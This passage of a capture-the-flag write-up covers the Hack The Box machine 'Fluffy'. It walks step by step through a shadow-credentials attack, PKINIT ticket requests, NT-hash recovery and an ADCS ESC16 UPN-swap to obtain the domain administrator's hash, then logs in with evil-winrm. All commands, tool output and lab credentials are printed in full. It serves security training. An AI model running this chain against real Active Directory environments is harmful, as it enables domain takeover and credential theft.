</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating KeyCredential
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyCredential generated with DeviceID: 9e64f016-c1dd-66ff-c943-d87c4739d8dc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating the msDS-KeyCredentialLink attribute of CA_SVC
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Converting PEM -&gt; PFX with cryptography: Um3a3b8O.pfx
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PFX exportiert nach: Um3a3b8O.pfx
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Passwort f√ºr PFX: 2VE9C4kLIQE6OzNX4EFw
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved PFX <span style="color:#f92672">(</span><span style="color:#75715e">#PKCS12) certificate &amp; key at path: Um3a3b8O.pfx</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Must be used with password: 2VE9C4kLIQE6OzNX4EFw
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
</span></span></code></pre></div><p>Request TGT using <code>gettgtpkinit.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/PKINITtools<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ python3 gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx Um3a3b8O.pfx -pfx-pass 2VE9C4kLIQE6OzNX4EFw -dc-ip 10.10.11.69 ca_svc.ccache
</span></span><span style="display:flex;"><span>2025-06-23 23:53:36,555 minikerberos INFO     Loading certificate and key from file
</span></span><span style="display:flex;"><span>INFO:minikerberos:Loading certificate and key from file
</span></span><span style="display:flex;"><span>2025-06-23 23:53:36,581 minikerberos INFO     Requesting TGT
</span></span><span style="display:flex;"><span>INFO:minikerberos:Requesting TGT
</span></span><span style="display:flex;"><span>2025-06-23 23:53:41,946 minikerberos INFO     AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>INFO:minikerberos:AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2025-06-23 23:53:41,946 minikerberos INFO     828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7
</span></span><span style="display:flex;"><span>INFO:minikerberos:828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7
</span></span><span style="display:flex;"><span>2025-06-23 23:53:41,953 minikerberos INFO     Saved TGT to file
</span></span><span style="display:flex;"><span>INFO:minikerberos:Saved TGT to file
</span></span></code></pre></div><p>Set the KRB5CCNAME environment variable and run <code>getnthash.py</code> to retrieve the hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/PKINITtools<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ export KRB5CCNAME<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/ca_svc.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/PKINITtools<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ python3 getnthash.py -k 828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 fluffy.htb/ca_svc
</span></span><span style="display:flex;"><span>/home/cresp0/Desktop/fluffy/PKINITtools/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
</span></span><span style="display:flex;"><span>  import pkg_resources
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using TGT from cache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting ticket to self with PAC
</span></span><span style="display:flex;"><span>Recovered NT Hash
</span></span><span style="display:flex;"><span>ca0f4f9e9eb8a092addf53bb03fc98c8
</span></span></code></pre></div><h2 id="32-exploiting-esc16">3.2 Exploiting ESC16<a hidden class="anchor" aria-hidden="true" href="#32-exploiting-esc16">#</a></h2>
<p>Upon retrieving the hash, now we can use <code>Certipy</code> to enumerate for ADCS vulnerabilities.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/adcs_enum<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ certipy find -u <span style="color:#e6db74">&#39;ca_svc&#39;</span> -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled
</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">33</span> certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">11</span> enabled certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">14</span> issuance policies
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via RRP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> @ <span style="color:#e6db74">&#39;DC01.fluffy.htb&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving text output to <span style="color:#e6db74">&#39;20250624000309_Certipy.txt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote text output to <span style="color:#e6db74">&#39;20250624000309_Certipy.txt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving JSON output to <span style="color:#e6db74">&#39;20250624000309_Certipy.json&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote JSON output to <span style="color:#e6db74">&#39;20250624000309_Certipy.json&#39;</span>
</span></span></code></pre></div><p>Open the output file. It can be seen that the environment is vulnerable to <code>ESC16</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/adcs_enum<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ cat 20250624000309_Certipy.txt                                                                            
</span></span><span style="display:flex;"><span>Certificate Authorities
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    CA Name                             : fluffy-DC01-CA
</span></span><span style="display:flex;"><span>    DNS Name                            : DC01.fluffy.htb
</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>fluffy-DC01-CA, DC<span style="color:#f92672">=</span>fluffy, DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
</span></span><span style="display:flex;"><span>    Certificate Validity End            : 3024-04-17 16:11:16+00:00
</span></span><span style="display:flex;"><span>    Web Enrollment
</span></span><span style="display:flex;"><span>      HTTP
</span></span><span style="display:flex;"><span>        Enabled                         : False
</span></span><span style="display:flex;"><span>      HTTPS
</span></span><span style="display:flex;"><span>        Enabled                         : False
</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span><span style="display:flex;"><span>    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
</span></span><span style="display:flex;"><span>    Permissions
</span></span><span style="display:flex;"><span>      Owner                             : FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>      Access Rights
</span></span><span style="display:flex;"><span>        ManageCa                        : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>        ManageCertificates              : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>        Enroll                          : FLUFFY.HTB<span style="color:#ae81ff">\C</span>ert Publishers
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
</span></span><span style="display:flex;"><span>      ESC16                             : Security Extension is disabled.
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Remarks
</span></span><span style="display:flex;"><span>      ESC16                             : Other prerequisites may be required <span style="color:#66d9ef">for</span> this to be exploitable. See the wiki <span style="color:#66d9ef">for</span> more details.
</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
</span></span></code></pre></div><p>From the output above, we can see that 1.3.6.1.4.1.311.25.2 is in <code>Disabled Extensions</code>. 1.3.6.1.4.1.311.25.2 is the Object Identifier (<code>OID</code>) of the special extension <code>szOID_NTDS_CA_SECURITY_EXT</code>. Okay, let&rsquo;s go to how CA works when the extension is enabled. So when CA issues a certificate, this extension embeds the SID of the AD account that requested the certificate directly into the certificate. But when the extension is disabled, Windows will fall back to using a weak mapping, like mapping the UPN in the cert to an account. Okay that&rsquo;s too much talking. The general view is the CA issues a cert to an account while the extension is disabled. So when the user uses the certificate for authentication (certificate-based authentication), the DC will have to check if the cert is the user&rsquo;s belonging, so the DC will blindly just check the identifiers inside the cert (like the UPN in the Subject Alternative Name, or sometimes the CN/email). If the SID extension is missing (which it is missing).. the DC can‚Äôt strongly tie the cert back to the exact AD account ‚Äî it only trusts whatever strings are in the cert, which is where the <code>ESC16</code> risk comes in.</p>
<p>So let&rsquo;s exploit this. We wanna update the ca_svc UPN to admin so when requesting for a certificate, the generated certificate will have Admin&rsquo;s UPN embedded in it. Update the ca_svc UPN to administrator.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/movejfleischman<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ certipy account -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -target <span style="color:#e6db74">&#39;fluffy.htb&#39;</span> -upn <span style="color:#e6db74">&#39;Administrator@fluffy.htb&#39;</span> -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> update    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> DNS resolution failed: The DNS query name does not exist: fluffy.htb.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
</span></span><span style="display:flex;"><span>    userPrincipalName                   : Administrator@fluffy.htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_svc&#39;</span>
</span></span></code></pre></div><p>Next, request a certificate using the account ca_svc and its hash retrieved from shadow credential attack. Remember, only the <code>UPN</code> (<a href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a>) of ca_svc is changed, not its <code>sAMAccountName</code> (ca_svc), thus the command below uses the &ldquo;-u &lsquo;ca_svc&rsquo;&rdquo;.</p>
<p>This command will have an output of the Administrator certificate because the CA embeds the ca_svc&rsquo;s new UPN to the certificate.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/movejfleischman<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ certipy req -dc-ip <span style="color:#e6db74">&#39;10.10.11.69&#39;</span> -u <span style="color:#e6db74">&#39;ca_svc&#39;</span> -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target <span style="color:#e6db74">&#39;fluffy.htb&#39;</span> -ca <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> -template <span style="color:#e6db74">&#39;User&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;Administrator@fluffy.htb&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
</span></span></code></pre></div><p>Revert back the UPN change.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/movejfleischman<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ certipy account -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> -dc-ip 10.10.11.69 -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> -upn <span style="color:#e6db74">&#39;&#39;</span> update
</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
</span></span><span style="display:flex;"><span>    userPrincipalName                   : *DELETED*
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_svc&#39;</span>
</span></span></code></pre></div><p>Perform authentication (certificate-based) using the administrator cert, <code>Certipy</code> will get the hash for you.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/movejfleischman<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69
</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     SAN UPN: <span style="color:#e6db74">&#39;Administrator@fluffy.htb&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;administrator@fluffy.htb&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator@fluffy.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
</span></span></code></pre></div><p>Lastly, use <code>evil-winrm</code> to log in using Admin credentials</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ‚îÄ<span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span>‚îÄ<span style="color:#f92672">(</span>cresp0„âøkali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/fluffy/movejfleischman<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ$ evil-winrm -i 10.10.11.69 -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -H <span style="color:#e6db74">&#39;8da83a3fa618b6e3a00e93f676c92a6e&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>-ar---        6/23/2025   4:33 PM             <span style="color:#ae81ff">34</span> root.txt
</span></span></code></pre></div><h1 id="resources">Resources<a hidden class="anchor" aria-hidden="true" href="#resources">#</a></h1>
<ol>
<li>CVE-2025-24071 - <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">https://cti.monster/blog/2025/03/18/CVE-2025-24071.html</a></li>
<li>CVE-2025-24071 exploit - <a href="https://www.exploit-db.com/exploits/52310">https://www.exploit-db.com/exploits/52310</a></li>
<li>PKINIT exploitation tools - <a href="https://github.com/dirkjanm/PKINITtools">https://github.com/dirkjanm/PKINITtools</a></li>
<li>Pywhisker - <a href="https://github.com/ShutdownRepo/pywhisker">https://github.com/ShutdownRepo/pywhisker</a></li>
<li>Shadow Credentials - <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</a></li>
<li>Shadow Credentials - <a href="https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/">https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/</a></li>
</ol>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on x"
            href="https://x.com/intent/tweet/?text=HTB%20-%20Fluffy&amp;url=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f&amp;title=HTB%20-%20Fluffy&amp;summary=HTB%20-%20Fluffy&amp;source=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f&title=HTB%20-%20Fluffy">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
